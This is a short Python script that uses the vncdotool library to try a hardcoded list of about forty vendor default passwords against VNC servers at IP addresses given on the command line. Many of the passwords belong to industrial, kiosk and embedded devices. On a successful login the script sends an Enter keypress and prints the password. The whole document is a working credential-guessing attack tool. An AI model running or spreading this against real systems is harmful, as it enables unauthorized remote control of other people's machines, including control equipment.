import sys
import argparse
from vncdotool import api

def swiper(ips, display):
	passlist = [ None,
			'FELDTECH_VNC',
			'vnc_pcci',
			'elux',
			'Passwort',
			'visam',
			'password',
			'Amx1234!',
			'1988',
			'admin',
			'Vision2',
			'ADMIN',
			'TOUCHLON',
			'EltakoFVS',
			'Wyse#123',
			'muster',
			'passwd11',
			'qwasyx21',
			'Administrator',
			'ripnas',
			'eyevis',
			'fidel123',
			'Admin#1',
			'default',
			'sigmatek',
			'hapero',
			'1234',
			'pass',
			'raspberry',
			'user',
			'solarfocus',
			'AVStumpfl',
			'm9ff.QW',
			'maryland-dstar',
			'pass1',
			'pass2',
			'instrument',
			'beijer',
			'vnc',
			'yesco',
			'protech'] 
	for ip in ips:
		print('For ip {0}'.format(ip))
		for passwd in passlist:
			try:
				print('\tAttempting {0}'.format(passwd))
				client = api.connect('{0}:{1}'.format(ip,display), password=passwd)
				client.timeout = 2
				client.keyPress('enter')
				print(passwd)
				quit()
			except:
				continue
			print("Password not found for {0}".format(ip))

def main():
	parser=argparse.ArgumentParser(description='Search for default credentials on VNC servers')
	parser.add_argument('ips', nargs='+', type=str)
	parser.add_argument('--display', default='0', type=str, required=False)
	args = parser.parse_args(sys.argv)
	swiper(args.ips[1:], args.display)

if __name__=='__main__':
	main()
